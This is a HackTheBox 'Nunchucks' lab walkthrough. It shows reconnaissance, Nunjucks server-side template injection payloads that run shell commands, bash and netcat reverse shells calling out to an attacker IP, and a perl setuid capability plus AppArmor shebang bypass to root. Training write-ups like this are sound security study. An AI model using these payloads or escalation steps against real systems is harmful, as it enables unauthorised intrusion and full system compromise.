---
title: Nunchucks
tags:
  - HackTheBox
  - Easy
  - Linux
  - SSTI
  - Nodejs
  - Capabilities
  - AppArmor
  - Perl
date: 2024-09-13T00:00:00Z
---
![](Pasted%20image%2020241113095057.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.122 nunchucks.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- nunchucks.htb > sC.txt

[redacted]
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  https
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

So I took a look at the webpage:

![](Pasted%20image%2020241113095424.png)

Inspecting the source code I discovered the `/signup` section, but it's currently unavailable:

![](Pasted%20image%2020241113095638.png)

So I decided to check for virtual hosts enumeration with [Wfuzz 🐙](/notes/tools/wfuzz.md):

```shell
wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb

[redacted]
=====================================================================
ID           Response   Lines    Word       Chars       Payload              
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"
```

So I added the new vhost and visited it:

![](Pasted%20image%2020241113102749.png)

Checking Wappalyzer, it seems that the server is using Node.js.

### Exploitation

If we check [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect), we can find a NUNJUCKS SSTI:
- More detailed in [disse.cting](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

```shell
{{7*7}} = 49
{{foo}} = No output
#{7*7} = #{7*7}
{{console.log(1)}} = Error
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
# revshell
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.24/666 0>&1\"')")()}}
```

I got errors executing the upper payloads:

![](Pasted%20image%2020241113104255.png)

So I escaped the quotes:

```shell
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@gitblanc.com"}
# revshell
{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('mkfifo /tmp/fmkltf; nc 10.10.14.24 666 0</tmp/fmkltf | /bin/sh >/tmp/fmkltf 2>&1; rm /tmp/fmkltf')\")()}}@gitblanc.com"}
```

![](Pasted%20image%2020241113104430.png)

![](Pasted%20image%2020241113105307.png)

> I got a reverse shell :D and can read user flag

![](Pasted%20image%2020241113105248.png)

![](Pasted%20image%2020241113105431.png)

## Privilege escalation

Enumerating the filesystem we see that `perl` has setuid capabilities set:

```shell
getcap -r / 2>&1 | grep -v 'Operation not permitted' | grep -v 'Operation not supported'

[redacted]
/usr/bin/perl = cap_setuid+ep
```

So I checked [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#suid):

```shell
which perl
/usr/bin/perl

# Then
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

If we now try to read the `/etc/shadow` file we can't even with the `setuid` enabled:

```shell
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /etc/shadow";'
cat: /etc/shadow: Permission denied
```

So I checked the output of the `whoami` command:

```shell
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```

I tried to read the `root.txt` flag but had no permissions:

```shell
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'
cat: /root/root.txt: Permission denied
```

This has to be an AppArmor Profile stablished for perl. If we perform some enumeration:

```shell
ls /etc/apparmor.d/

[redacted]
-rw-r--r--   1 root root   442 Sep 26  2021 usr.bin.perl
```

There is a profile for perl :/

Inspecting the root path, I found a script in `/opt`:

![](Pasted%20image%2020241113110849.png)

```perl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

We can see that the script has the `setuid` set to 0, but we cannot make any changes to the script. 

I checked the Apparmor version:

```shell
apparmor_parser --version
AppArmor parser version 2.13.3
```

So I searched in Google for "*Apparmor bugs*". I found the following [shebang bug](https://bugs.launchpad.net/apparmor/+bug/1911431) in Launchpad, so I created a script that executes a shell as root:

```perl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```

> I executed it and became root. Got root flag!

![](Pasted%20image%2020241113111954.png)

==Machine pwned!==



